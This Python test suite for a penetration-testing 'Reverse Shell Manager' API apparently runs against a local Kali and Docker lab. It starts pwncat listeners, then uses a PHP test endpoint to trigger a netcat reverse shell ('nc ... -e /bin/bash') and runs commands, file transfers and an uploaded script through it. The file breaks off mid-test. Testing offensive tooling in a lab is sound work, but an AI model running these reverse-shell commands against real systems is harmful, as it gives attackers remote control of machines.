#!/usr/bin/env python3
"""
Complete test suite for Reverse Shell Manager functionality.
Tests real reverse shell connections using Docker container with helper functions.
"""

import unittest
import requests
import time
import base64
import json
import sys
import os
import subprocess
import threading

# Import configuration
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from test_config import (
    KALI_SERVER_CONFIG, REVERSE_SHELL_CONFIG, TEST_FILES, TIMEOUTS,
    get_test_file_content, get_docker_test_ip
)

# Display configuration
print("🐳 Using Kali server with Docker container")
print(f"   Kali server: {KALI_SERVER_CONFIG['base_url']}")
print(f"   Docker IP for tests: {get_docker_test_ip()}")


class TestReverseShellManager(unittest.TestCase):
    """Complete tests for Reverse Shell Manager using REAL reverse shell connections"""
    
    @classmethod
    def setUpClass(cls):
        """Setup before all tests."""
        print("\n" + "="*60)
        print("🚀 REVERSE SHELL MANAGER TESTS - Kali Server")
        print("="*60)
        
        # Simple Kali server check
        try:
            response = requests.get(f"{KALI_SERVER_CONFIG['base_url']}/health", timeout=10)
            if response.status_code != 200:
                raise unittest.SkipTest("❌ Kali server not accessible")
        except Exception:
            raise unittest.SkipTest("❌ Kali server not accessible")
        
        cls.base_url = KALI_SERVER_CONFIG["base_url"]
        cls.reverse_shell_config = REVERSE_SHELL_CONFIG
        cls.session_prefix = f"test_shell_{int(time.time())}"
        cls.active_sessions = []
        
        # Use Docker bridge IP for tests
        cls.docker_ip = get_docker_test_ip()
        
        print(f"🎯 Kali server: {cls.base_url}")
        print(f"🐳 Docker IP for tests: {cls.docker_ip}")
        print(f"🔗 Reverse shell ports: 4447+")
        print("-"*60)
    
    @classmethod
    def tearDownClass(cls):
        """Cleanup after all tests."""
        print("\n" + "="*60)
        print("🧹 CLEANUP - Stopping all test sessions")
        print("="*60)
        
        # Step 1: List all active sessions first
        try:
            print("🔍 Checking for active sessions to clean up...")
            response = requests.get(f"{cls.base_url}/api/reverse-shell/sessions", 
                                  timeout=TIMEOUTS["quick"])
            
            if response.status_code == 200:
                active_sessions = response.json()
                print(f"📋 Found {len(active_sessions)} total active sessions")
                
                # Clean up our test sessions and any that were added to active_sessions list
                sessions_to_clean = set(cls.active_sessions)  # Start with tracked sessions
                
                # Add any active sessions that match our test patterns
                test_patterns = [cls.session_prefix, "test_shell_"]
                for session_id in active_sessions.keys():
                    if any(pattern in session_id for pattern in test_patterns):
                        sessions_to_clean.add(session_id)
                
                if sessions_to_clean:
                    print(f"🔧 Cleaning up {len(sessions_to_clean)} test sessions...")
                    for session_id in sessions_to_clean:
                        try:
                            stop_response = requests.post(
                                f"{cls.base_url}/api/reverse-shell/{session_id}/stop", 
                                timeout=TIMEOUTS["quick"]
                            )
                            if stop_response.status_code == 200:
                                print(f"✅ Stopped session: {session_id}")
                            else:
                                print(f"⚠️  Failed to stop session: {session_id}")
                        except Exception as e:
                            print(f"❌ Error stopping session {session_id}: {str(e)}")
                else:
                    print("✅ No test sessions to clean up")
            else:
                print(f"⚠️  Could not list sessions: {response.status_code}")
                # Fallback: try to stop tracked sessions anyway
                for session_id in cls.active_sessions:
                    try:
                        requests.post(f"{cls.base_url}/api/reverse-shell/{session_id}/stop", 
                                    timeout=TIMEOUTS["quick"])
                    except:
                        pass
                        
        except Exception as e:
            print(f"⚠️  Error during session cleanup: {e}")
        
        # Step 2: Only clean ports that are actually problematic
        test_ports = [
            REVERSE_SHELL_CONFIG["listener_port"],      # 4500
            REVERSE_SHELL_CONFIG["alternative_port"],   # 4501
            4448,  # Used in test_01
            4460   # Used in test_09
        ]
        
        print("🔍 Checking for orphaned processes on test ports...")
        for port in test_ports:
            try:
                find_cmd = f"netstat -tulpn | grep :{port}"
                result = subprocess.run(find_cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if result.stdout.strip():
                    # Don't kill Docker processes - they're legitimate
                    if not any(keyword in result.stdout.lower() for keyword in ['docker', 'containerd']):
                        print(f"⚠️  Found orphaned process on port {port}:")
                        print(f"   {result.stdout.strip()}")
                        
                        # Extract and kill specific PIDs
                        pids = []
                        for line in result.stdout.strip().split('\n'):
                            if line and f":{port}" in line:
                                parts = line.split()
                                if len(parts) >= 7:
                                    pid_info = parts[6]
                                    if '/' in pid_info:
                                        pid_str = pid_info.split('/')[0]
                                        if pid_str.isdigit():
                                            pids.append(int(pid_str))
                        
                        for pid in pids:
                            try:
                                subprocess.run(f"kill -9 {pid}", shell=True, timeout=3)
                                print(f"🔫 Killed orphaned process {pid} on port {port}")
                            except:
                                pass
                    else:
                        print(f"✅ Port {port} is used by Docker (legitimate, not cleaning)")
                else:
                    print(f"✅ Port {port} is clean")
                        
            except Exception as e:
                print(f"⚠️  Error cleaning port {port}: {e}")
        
        time.sleep(2)  # Give time for cleanup
        print("🏁 Cleanup completed")
        print("="*60)

    # =================================================================
    # HELPER FUNCTIONS FOR REVERSE SHELL MANAGEMENT
    # =================================================================
    
    def force_kill_port_processes(self, port):
        """
        Force kill any processes using the specified port.
        Uses multiple detection methods to handle cases where process info is limited.
        
        Args:
            port (int): Port number to clean up
        """
        try:
            print(f"🔍 Checking port {port} usage with multiple methods...")
            
            all_pids = set()  # Use set to avoid duplicates
            
            import platform
            is_windows = platform.system().lower() == 'windows'
            
            # Method 1: netstat (platform-specific)
            if is_windows:
                find_cmd = f'netstat -ano | findstr ":{port}"'
            else:
                find_cmd = f"netstat -tulpn | grep :{port}"
            
            result = subprocess.run(find_cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.stdout.strip():
                print(f"📋 netstat output for port {port}:\n{result.stdout}")
                
                # Extract PIDs from netstat output
                for line in result.stdout.strip().split('\n'):
                    if line and f":{port}" in line:
                        parts = line.split()
                        if is_windows:
                            # Windows netstat format: last column is PID
                            if len(parts) >= 5 and parts[-1].isdigit():
                                all_pids.add(int(parts[-1]))
                        else:
                            # Linux netstat format
                            if len(parts) >= 7:
                                pid_info = parts[6]  # Last column usually contains PID/program
                                if '/' in pid_info:
                                    pid_str = pid_info.split('/')[0]
                                    if pid_str.isdigit():
                                        all_pids.add(int(pid_str))
                                elif pid_info.isdigit():
                                    all_pids.add(int(pid_info))
            
            # Method 2: ss command (alternative to netstat)
            ss_cmd = f"ss -tlnp | grep :{port}"
            ss_result = subprocess.run(ss_cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if ss_result.stdout.strip():
                print(f"📋 ss output for port {port}:\n{ss_result.stdout}")
                
                # Extract PIDs from ss output
                for line in ss_result.stdout.strip().split('\n'):
                    if f":{port}" in line:
                        # ss output format: users:(("process_name",pid=XXXX,fd=X))
                        import re
                        pid_matches = re.findall(r'pid=(\d+)', line)
                        for pid_str in pid_matches:
                            all_pids.add(int(pid_str))
            
            # Method 3: lsof command (most reliable for getting PIDs)
            lsof_cmd = f"lsof -ti:{port}"
            lsof_result = subprocess.run(lsof_cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if lsof_result.stdout.strip():
                print(f"� lsof output for port {port}:\n{lsof_result.stdout}")
                lsof_pids = [int(pid.strip()) for pid in lsof_result.stdout.strip().split('\n') if pid.strip().isdigit()]
                all_pids.update(lsof_pids)
            
            # Method 4: fuser command to find PIDs
            fuser_cmd = f"fuser {port}/tcp 2>/dev/null"
            fuser_result = subprocess.run(fuser_cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if fuser_result.stdout.strip():
                print(f"📋 fuser output for port {port}:\n{fuser_result.stdout}")
                fuser_pids = [int(pid.strip()) for pid in fuser_result.stdout.strip().split() if pid.strip().isdigit()]
                all_pids.update(fuser_pids)
            
            # Kill all found processes
            if all_pids:
                print(f"🔫 Found {len(all_pids)} processes using port {port}: {list(all_pids)}")
                
                for pid in all_pids:
                    try:
                        print(f"🔫 Killing process {pid} using port {port}")
                        
                        if is_windows:
                            # Windows: use taskkill
                            kill_cmd = f"taskkill /F /PID {pid}"
                        else:
                            # Linux/Unix: use kill (your existing commands)
                            kill_cmd = f"kill -9 {pid}"
                        
                        result = subprocess.run(kill_cmd, shell=True, capture_output=True, text=True, timeout=3)
                        
                        if result.returncode == 0:
                            print(f"✅ Successfully killed process {pid}")
                        else:
                            print(f"⚠️  Failed to kill process {pid} (exit code: {result.returncode})")
                            if result.stderr:
                                print(f"   Error: {result.stderr.strip()}")
                            
                            # Try with sudo on Linux if regular kill fails
                            if not is_windows:
                                try:
                                    print(f"🔫 Trying with sudo to kill process {pid}")
                                    sudo_result = subprocess.run(f"sudo kill -9 {pid}", shell=True, capture_output=True, text=True, timeout=3)
                                    if sudo_result.returncode == 0:
                                        print(f"✅ Successfully killed process {pid} with sudo")
                                    else:
                                        print(f"⚠️  sudo kill also failed for process {pid}")
                                except Exception as sudo_e:
                                    print(f"⚠️  sudo kill exception for process {pid}: {sudo_e}")
                        
                    except Exception as e:
                        print(f"⚠️  Exception killing process {pid}: {e}")
                
                time.sleep(3)  # Give time for processes to die
                
                # Verify cleanup with socket test (cross-platform)
                print(f"🔍 Verifying cleanup of port {port}...")
                try:
                    import socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result_code = sock.connect_ex(('localhost', port))
                    sock.close()
                    
                    if result_code == 0:
                        print(f"⚠️  Port {port} is still accessible after cleanup attempt")
                    else:
                        print(f"✅ Port {port} successfully cleaned up")
                except Exception as e:
                    print(f"⚠️  Verification test failed: {e}")
            else:
                # No PIDs found, try alternative cleanup methods
                print(f"🔫 No PIDs found for port {port}, trying alternative cleanup methods...")
                
                if is_windows:
                    # Windows alternative methods (limited options)
                    cleanup_methods = [
                        f'wmic process where "CommandLine like \'%:{port}%\'" call terminate',
                    ]
                else:
                    # Linux alternative methods (your existing commands)
                    cleanup_methods = [
                        f"fuser -k {port}/tcp",
                        f"sudo fuser -k {port}/tcp",
                        f"pkill -f ':{port}'",
                        f"sudo pkill -f ':{port}'"
                    ]
                
                for method in cleanup_methods:
                    try:
                        print(f"🔫 Trying cleanup method: {method}")
                        subprocess.run(method, shell=True, timeout=5)
                        time.sleep(1)
                    except Exception as e:
                        print(f"⚠️  Method '{method}' failed: {e}")
                
                # Final verification with socket test (cross-platform)
                print(f"🔍 Final verification of port {port}...")
                try:
                    import socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result_code = sock.connect_ex(('localhost', port))
                    sock.close()
                    
                    if result_code == 0:
                        print(f"⚠️  Port {port} still appears to be in use after all cleanup attempts")
                    else:
                        print(f"✅ Port {port} appears to be cleaned up")
                except Exception as e:
                    print(f"⚠️  Final verification failed: {e}")
            
        except Exception as e:
            print(f"⚠️  Error during port cleanup for {port}: {e}")

    def ensure_clean_environment(self):
        """
        Ensure test environment is clean before starting tests.
        Only clean up sessions that actually exist.
        """
        print("🧹 Ensuring clean test environment...")
        
        # Step 1: List all active sessions first
        try:
            print("🔍 Checking for active sessions...")
            response = requests.get(f"{self.base_url}/api/reverse-shell/sessions", 
                                  timeout=TIMEOUTS["quick"])
            
            if response.status_code == 200:
                active_sessions = response.json()
                print(f"📋 Found {len(active_sessions)} active sessions")
                
                # Only stop sessions that might interfere with our tests
                test_session_patterns = [
                    self.session_prefix,  # Any session with our test prefix
                    "test_shell_",        # Generic test sessions
                    "_connection_test",   # Connection test sessions
                    "_listener_test",     # Listener test sessions
                    "_cleanup_test"       # Cleanup test sessions
                ]
                
                sessions_to_stop = []
                for session_id, session_info in active_sessions.items():
                    # Check if this session matches our test patterns
                    if any(pattern in session_id for pattern in test_session_patterns):
                        sessions_to_stop.append((session_id, session_info))
                
                if sessions_to_stop:
                    print(f"🔧 Found {len(sessions_to_stop)} test sessions to clean up:")
                    for session_id, session_info in sessions_to_stop:
                        print(f"   📋 {session_id}: {session_info}")
                        try:
                            stop_response = requests.post(
                                f"{self.base_url}/api/reverse-shell/{session_id}/stop", 
                                timeout=TIMEOUTS["quick"]
                            )
                            if stop_response.status_code == 200:
                                print(f"   ✅ Stopped session: {session_id}")
                            else:
                                print(f"   ⚠️  Failed to stop session: {session_id}")
                        except Exception as e:
                            print(f"   ❌ Error stopping session {session_id}: {e}")
                else:
                    print("✅ No test sessions found to clean up")
            else:
                print(f"⚠️  Could not list sessions: {response.status_code}")
                
        except Exception as e:
            print(f"⚠️  Error listing sessions: {e}")
        
        # Step 2: Only force cleanup ports that are actually in use by orphaned processes
        test_ports = [
            REVERSE_SHELL_CONFIG["listener_port"],      # 4500
            REVERSE_SHELL_CONFIG["alternative_port"],   # 4501
            4448,  # Used in test_01
            4460   # Used in test_09
        ]
        
        print("🔍 Checking for orphaned processes on test ports...")
        ports_to_clean = []
        
        for port in test_ports:
            try:
                # Quick check if port is in use - use multiple methods for better detection
                find_cmd = f"netstat -tulpn | grep :{port}"
                result = subprocess.run(find_cmd, shell=True, capture_output=True, text=True, timeout=3)
                
                port_in_use = False
                port_output = ""
                
                if result.stdout.strip():
                    port_in_use = True
                    port_output = result.stdout.strip()
                    print(f"📋 netstat shows port {port} usage:\n{port_output}")
                
                # Alternative check using ss command (often more reliable)
                if not port_in_use:
                    ss_cmd = f"ss -tlnp | grep :{port}"
                    ss_result = subprocess.run(ss_cmd, shell=True, capture_output=True, text=True, timeout=3)
                    if ss_result.stdout.strip():
                        port_in_use = True
                        port_output = ss_result.stdout.strip()
                        print(f"📋 ss shows port {port} usage:\n{port_output}")
                
                # Third check using lsof (if available)
                if not port_in_use:
                    lsof_cmd = f"lsof -i:{port}"
                    lsof_result = subprocess.run(lsof_cmd, shell=True, capture_output=True, text=True, timeout=3)
                    if lsof_result.stdout.strip():
                        port_in_use = True
                        port_output = lsof_result.stdout.strip()
                        print(f"📋 lsof shows port {port} usage:\n{port_output}")
                
                if port_in_use:
                    # Check if it's NOT a Docker process (Docker processes are legitimate)
                    # Look for keywords that indicate Docker processes
                    docker_keywords = ['docker', 'containerd', 'dockerd']
                    is_docker_process = any(keyword in port_output.lower() for keyword in docker_keywords)
                    
                    if not is_docker_process:
                        print(f"⚠️  Found orphaned process on port {port}")
                        print(f"   Details: {port_output}")
                        ports_to_clean.append(port)
                    else:
                        print(f"✅ Port {port} is used by Docker (legitimate)")
                else:
                    print(f"✅ Port {port} is clean")
                    
            except Exception as e:
                print(f"⚠️  Error checking port {port}: {e}")
                # If we can't check properly, assume it might need cleaning
                ports_to_clean.append(port)
                
        # Only clean ports that actually need cleaning
        if ports_to_clean:
            print(f"🔫 Cleaning {len(ports_to_clean)} orphaned ports: {ports_to_clean}")
            for port in ports_to_clean:
                self.force_kill_port_processes(port)
        else:
            print("✅ No orphaned processes found on test ports")
        
        print("✅ Environment cleanup completed")
    
    def establish_reverse_shell_connection(self, max_attempts=3):
        """
        Helper function to establish a working reverse shell connection.
        Uses a fixed port and ensures proper cleanup.
        
        Returns:
            str: Session ID if successful
            None: If failed to establish connection
        """
        print("🔧 Establishing REAL reverse shell connection...")
        
        # Use fixed port from configuration - if it's busy, it means previous test didn't cleanup properly
        port = REVERSE_SHELL_CONFIG["listener_port"]  # 4500 from test_config.py
        session_id = f"{self.session_prefix}_connection_test"
        
        for attempt in range(1, max_attempts + 1):
            try:
                print(f"🔄 Attempt {attempt}/{max_attempts} using port {port}")
                
                # If not first attempt, clean up any leftover session first
                if attempt > 1:
                    print("🧹 Cleaning up potential leftover session before retry...")
                    try:
                        requests.post(f"{self.base_url}/api/reverse-shell/{session_id}/stop", 
                                    timeout=TIMEOUTS["quick"])
                        time.sleep(2)  # Give time for cleanup
                    except:
                        pass
                
                # Step 1: Start listener using correct endpoint
                print(f"🎧 Starting listener on port {port}")
                listener_data = {
                    "session_id": session_id,
                    "port": port,
                    "listener_type": "pwncat"  # Use pwncat as default
                }
                
                listener_response = requests.post(
                    f"{self.base_url}/api/reverse-shell/listener/start", 
                    json=listener_data, 
                    timeout=TIMEOUTS["medium"]
                )
                
                if listener_response.status_code != 200:
                    print(f"❌ Failed to start listener: {listener_response.status_code}")
                    continue
                    
                listener_result = listener_response.json()
                if not listener_result.get("success", False):
                    print(f"❌ Listener start failed: {listener_result}")
                    continue
                
                print(f"✅ Listener started with session: {session_id}")
                
                # Step 2: Trigger reverse shell manually using docker container
                print(f"🚀 Triggering reverse shell to 172.17.0.1:{port} from container")
                
                # Use localhost instead of container internal IP (Windows Docker networking fix)
                trigger_command = f'curl -X POST http://localhost:8080/test_reverse_shell.php -H "Content-Type: application/json" -d "{{\\"command\\": \\"nc 172.17.0.1 {port} -e /bin/bash\\"}}"'
                
                # Execute trigger in background (it will hang when connection is established)
                def trigger_shell():
                    try:
                        subprocess.run(trigger_command, shell=True, timeout=5)
                    except subprocess.TimeoutExpired:
                        print("✅ Trigger command blocked (connection established)")
                    except Exception as e:
                        print(f"⚠️ Trigger error: {e}")
                
                trigger_thread = threading.Thread(target=trigger_shell)
                trigger_thread.daemon = True
                trigger_thread.start()
                
                # Step 3: Wait for connection to establish
                print("⏳ Waiting for connection to establish...")
                time.sleep(5)  # Give time for connection
                
                # Step 4: Verify connection with multiple checks
                if self._verify_real_connection(session_id, max_checks=5):
                    print(f"✅ REAL reverse shell connection established: {session_id}")
                    self.active_sessions.append(session_id)
                    return session_id
                else:
                    print(f"❌ Attempt {attempt} failed - no real connection established")
                    # Clean up failed session - ALWAYS cleanup with fixed session_id
                    print("🧹 Cleaning up failed attempt...")
                    try:
                        requests.post(f"{self.base_url}/api/reverse-shell/{session_id}/stop", 
                                    timeout=TIMEOUTS["quick"])
                        time.sleep(1)  # Give time for cleanup
                    except Exception as cleanup_error:
                        print(f"⚠️  Cleanup error: {cleanup_error}")
                
                if attempt < max_attempts:
                    print("⏳ Waiting before next attempt...")
                    time.sleep(3)  # Increased wait time for proper cleanup
                    
            except Exception as e:
                print(f"❌ Attempt {attempt} error: {str(e)}")
                continue
        
        print(f"❌ Failed to establish reverse shell connection after {max_attempts} attempts")
        return None

    def _verify_real_connection(self, session_id, max_checks=5):
        """
        Verify that a reverse shell connection is actually established and working.
        
        Args:
            session_id (str): Session ID to verify
            max_checks (int): Maximum number of verification attempts
            
        Returns:
            bool: True if connection is verified, False otherwise
        """
        for check_attempt in range(1, max_checks + 1):
            try:
                print(f"🔍 Connection check {check_attempt}/{max_checks}")
                
                # Check session status using correct endpoint
                status_response = requests.get(
                    f"{self.base_url}/api/reverse-shell/{session_id}/status", 
                    timeout=TIMEOUTS["quick"]
                )
                
                if status_response.status_code == 200:
                    status_result = status_response.json()
                    print(f"📊 Status: {status_result}")
                    
                    # Check if connection is established
                    if (status_result.get("is_connected", False) and 
                        status_result.get("process_alive", False) and
                        status_result.get("actual_network_connection", False)):
                        
                        # Additional verification: try to execute a test command
                        print("🧪 Testing command execution...")
                        test_cmd_response = requests.post(
                            f"{self.base_url}/api/reverse-shell/{session_id}/command",
                            json={"command": "echo 'connection_test_ok'", "timeout": 10},
                            timeout=TIMEOUTS["quick"]
                        )
                        
                        if test_cmd_response.status_code == 200:
                            cmd_result = test_cmd_response.json()
                            if (cmd_result.get("success", False) and 
                                "connection_test_ok" in cmd_result.get("output", "")):
                                print("✅ Connection verified with successful command execution")
                                return True
                            else:
                                print("⚠️  Command execution failed, connection may not be fully established")
                        else:
                            print("⚠️  Could not test command execution")
                    else:
                        print("⚠️  Connection not fully established yet")
                else:
                    print(f"⚠️  Status check failed: {status_response.status_code}")
                
                # Wait before next check
                if check_attempt < max_checks:
                    time.sleep(2)
                    
            except Exception as e:
                print(f"⚠️  Connection check {check_attempt} error: {str(e)}")
                time.sleep(2)
        
        print("❌ Connection verification failed")
        return False

    def cleanup_reverse_shell_session(self, session_id):
        """
        Helper function to properly clean up a reverse shell session.
        Enhanced version that ensures port cleanup.
        
        Args:
            session_id (str): Session ID to clean up
            
        Returns:
            bool: True if cleanup successful, False otherwise
        """
        if not session_id:
            return True
            
        cleanup_success = False
        session_port = None
        
        try:
            print(f"🧹 Cleaning up session: {session_id}")
            
            # First, try to get session info to know which port it was using
            try:
                status_response = requests.get(
                    f"{self.base_url}/api/reverse-shell/{session_id}/status", 
                    timeout=TIMEOUTS["quick"]
                )
                if status_response.status_code == 200:
                    status_result = status_response.json()
                    session_port = status_result.get("port")
                    print(f"   Session {session_id} was using port {session_port}")
            except Exception as e:
                print(f"   Could not get session port info: {e}")
            
            # Stop the session via API
            response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/stop", 
                timeout=TIMEOUTS["quick"]
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get("success", False):
                    print(f"✅ Session stopped successfully via API: {session_id}")
                    cleanup_success = True
                else:
                    print(f"⚠️  API cleanup reported failure: {result}")
            else:
                print(f"⚠️  API cleanup request failed: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Error during API cleanup: {str(e)}")
        
        # Give time for the enhanced stop() method to do its work
        time.sleep(2)
        
        # Additional port cleanup if we know which port was used
        if session_port:
            print(f"🔫 Additional port cleanup for port {session_port}...")
            
            # Check if port is still in use
            try:
                lsof_result = subprocess.run(
                    f"lsof -ti:{session_port}",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                if lsof_result.stdout.strip():
                    remaining_pids = [int(pid.strip()) for pid in lsof_result.stdout.strip().split('\n') if pid.strip().isdigit()]
                    print(f"   🔫 Found {len(remaining_pids)} remaining processes on port {session_port}: {remaining_pids}")
                    
                    for pid in remaining_pids:
                        try:
                            subprocess.run(f"kill -KILL {pid}", shell=True, timeout=3)
                            print(f"   ✅ Force killed remaining process {pid}")
                        except Exception as kill_e:
                            print(f"   ⚠️  Could not kill process {pid}: {kill_e}")
                            # Try with sudo
                            try:
                                subprocess.run(f"sudo kill -KILL {pid}", shell=True, timeout=3)
                                print(f"   ✅ Force killed remaining process {pid} with sudo")
                            except:
                                pass
                else:
                    print(f"   ✅ No remaining processes found on port {session_port}")
                    
            except Exception as port_check_e:
                print(f"   ⚠️  Error checking remaining processes: {port_check_e}")
                # Force cleanup anyway
                self.force_kill_port_processes(session_port)
        
        # Remove from active sessions list regardless of API response
        if session_id in self.active_sessions:
            self.active_sessions.remove(session_id)
        
        # Final verification with socket test
        if session_port:
            print(f"🔍 Final verification that port {session_port} is free...")
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result_code = sock.connect_ex(('localhost', session_port))
                sock.close()
                
                if result_code == 0:
                    print(f"⚠️  Port {session_port} is still accessible after cleanup")
                else:
                    print(f"✅ Port {session_port} is now free")
            except Exception as verify_e:
                print(f"⚠️  Port verification failed: {verify_e}")
        
        return cleanup_success

    # =================================================================
    # ACTUAL TESTS - Each test is independent and uses helper functions
    # =================================================================

    def test_01_start_reverse_shell_listener(self):
        """Test starting a reverse shell listener"""
        print("\n🎯 Test: Starting reverse shell listener")
        
        # Clean environment first
        self.ensure_clean_environment()
        
        session_id = f"{self.session_prefix}_listener_test"
        listener_data = {
            "session_id": session_id,
            "port": 4448,
            "listener_type": "pwncat"
        }
        
        print(f"📋 Starting listener with data: {listener_data}")
        
        response = requests.post(f"{self.base_url}/api/reverse-shell/listener/start", 
                               json=listener_data, timeout=TIMEOUTS["medium"])
        
        print(f"📋 Response status: {response.status_code}")
        print(f"📋 Response content: {response.text}")
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        
        if not result.get("success", False):
            print(f"❌ Listener creation failed: {result}")
            self.fail(f"Listener creation failed: {result.get('error', 'Unknown error')}")
        
        # Add to cleanup list
        self.active_sessions.append(session_id)
        
        print(f"✅ Listener started successfully: {session_id}")
        
        # Clean up immediately after test
        print(f"🧹 Cleaning up session {session_id} with port 4448...")
        cleanup_success = self.cleanup_reverse_shell_session(session_id)

    def test_02_trigger_real_reverse_shell_connection(self):
        """Test triggering a REAL reverse shell connection"""
        print("\n🎯 Test: Triggering REAL reverse shell connection from Docker")
        
        # Ensure clean environment before test
        self.ensure_clean_environment()
        
        session_id = self.establish_reverse_shell_connection()
        if not session_id:
            self.fail("Failed to establish real reverse shell connection")
        
        print(f"✅ REAL reverse shell connection established: {session_id}")

    def test_03_execute_real_shell_commands(self):
        """Test executing REAL commands in reverse shell"""
        print("\n🎯 Test: Executing REAL commands in reverse shell")
        
        # Ensure clean environment before test
        self.ensure_clean_environment()
        
        # Establish connection for this test
        session_id = self.establish_reverse_shell_connection()
        if not session_id:
            self.skipTest("No real reverse shell connection available")
        
        try:
            # Test multiple commands
            test_commands = [
                ("whoami", "should return username"),
                ("pwd", "should return current directory"),
                ("echo 'test_command_execution'", "should echo test message"),
                ("ls /tmp", "should list temp directory"),
                ("uname -a", "should return system info")
            ]
            
            successful_commands = 0
            for cmd, description in test_commands:
                print(f"🔍 Testing command: {cmd}")
                
                response = requests.post(
                    f"{self.base_url}/api/reverse-shell/{session_id}/command",
                    json={"command": cmd, "timeout": 10},
                    timeout=TIMEOUTS["medium"]
                )
                
                self.assertEqual(response.status_code, 200)
                result = response.json()
                
                if result.get("success", False) and result.get("output", "").strip():
                    successful_commands += 1
                    print(f"✅ Command '{cmd}' executed successfully")
                    print(f"   Output: {result.get('output', '')[:100]}...")
                else:
                    print(f"❌ Command '{cmd}' failed: {result}")
            
            self.assertGreater(successful_commands, 2, "Should execute at least 3 commands successfully")
            print(f"✅ Successfully executed {successful_commands}/{len(test_commands)} commands")
            
        finally:
            # Clean up session
            self.cleanup_reverse_shell_session(session_id)

    def test_04_upload_and_verify_content(self):
        """Test uploading content via REAL reverse shell"""
        print("\n🎯 Test: Upload content via REAL reverse shell")
        
        # Ensure clean environment before test
        self.ensure_clean_environment()
        
        # Establish connection for this test
        session_id = self.establish_reverse_shell_connection()
        if not session_id:
            self.skipTest("No real reverse shell connection available")
        
        try:
            # Create test content
            test_content = f"Test file created via reverse shell at {time.strftime('%Y-%m-%d %H:%M:%S')}\nThis is a real upload test!"
            remote_path = f"/tmp/real_upload_{int(time.time())}.txt"
            
            # Upload content
            upload_data = {
                "content": base64.b64encode(test_content.encode()).decode(),
                "remote_file": remote_path,
                "encoding": "base64"  # Use base64 encoding like in our successful test
            }
            
            response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/upload-content",
                json=upload_data,
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            print(f"📋 Upload response: {result}")
            self.assertTrue(result.get("success", False), f"Upload failed: {result}")
            
            # Verify upload by reading the file
            verify_response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/command",
                json={"command": f"cat {remote_path}", "timeout": 10},
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(verify_response.status_code, 200)
            verify_result = verify_response.json()
            self.assertTrue(verify_result.get("success", False))
            
            # Check content
            file_content = verify_result.get("output", "")
            self.assertIn("Test file created via reverse shell", file_content)
            
            print(f"✅ Content uploaded and verified at {remote_path}")
            
        finally:
            # Clean up session
            self.cleanup_reverse_shell_session(session_id)

    def test_05_download_real_content(self):
        """Test downloading REAL content via reverse shell"""
        print("\n🎯 Test: Download REAL content via reverse shell")
        
        # Ensure clean environment before test
        self.ensure_clean_environment()
        
        # Establish connection for this test
        session_id = self.establish_reverse_shell_connection()
        if not session_id:
            self.skipTest("No real reverse shell connection available")
        
        try:
            # Create a test file first
            test_content = f"Real download test {int(time.time())}"
            remote_path = f"/tmp/download_test_{int(time.time())}.txt"
            
            # Create file using command
            create_response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/command",
                json={"command": f"echo '{test_content}' > {remote_path}", "timeout": 10},
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(create_response.status_code, 200)
            create_result = create_response.json()
            self.assertTrue(create_result.get("success", False))
            print(f"✅ Test file created: {remote_path}")
            
            # Download the file using correct endpoint
            download_data = {
                "remote_file": remote_path,
                "encoding": "base64"
            }
            
            download_response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/download-content",
                json=download_data,
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(download_response.status_code, 200)
            download_result = download_response.json()
            print(f"📋 Download response: {download_result}")
            self.assertTrue(download_result.get("success", False), f"Download failed: {download_result}")
            
            # Verify content
            if download_result.get("content"):
                decoded_content = base64.b64decode(download_result["content"]).decode()
                self.assertIn(test_content, decoded_content)
                print(f"✅ Downloaded content verified: '{decoded_content.strip()}'")
            
        finally:
            # Clean up session
            self.cleanup_reverse_shell_session(session_id)

    def test_06_upload_and_execute_real_payload(self):
        """Test uploading and executing REAL custom payload"""
        print("\n🎯 Test: Upload and execute REAL custom payload")
        
        # Ensure clean environment before test
        self.ensure_clean_environment()
        
        # Establish connection for this test
        session_id = self.establish_reverse_shell_connection()
        if not session_id:
            self.skipTest("No real reverse shell connection available")
        
        try:
            # Create a custom payload script
            payload_content = f"""#!/bin/bash
# Custom test payload - Generated at {time.strftime('%Y-%m-%d %H:%M:%S')}
echo "=== Custom Payload Execution Test ==="
echo "Current user: $(whoami)"
echo "Current directory: $(pwd)"
echo "System info: $(uname -a)"
echo "Payload executed successfully at $(date)"
echo "=== End of Payload ==="
"""
            
            remote_path = f"/tmp/custom_payload_{int(time.time())}.sh"
            
            # Upload payload
            upload_data = {
                "content": base64.b64encode(payload_content.encode()).decode(),
                "remote_file": remote_path,
                "encoding": "base64"
            }
            
            upload_response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/upload-content",
                json=upload_data,
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(upload_response.status_code, 200)
            upload_result = upload_response.json()
            self.assertTrue(upload_result.get("success", False), f"Upload failed: {upload_result}")
            print(f"✅ Payload uploaded: {remote_path}")
            
            # Make executable and execute
            exec_response = requests.post(
                f"{self.base_url}/api/reverse-shell/{session_id}/command",
                json={"command": f"chmod +x {remote_path} && bash {remote_path}", "timeout": 15},
                timeout=TIMEOUTS["medium"]
            )
            
            self.assertEqual(exec_response.status_code, 200)
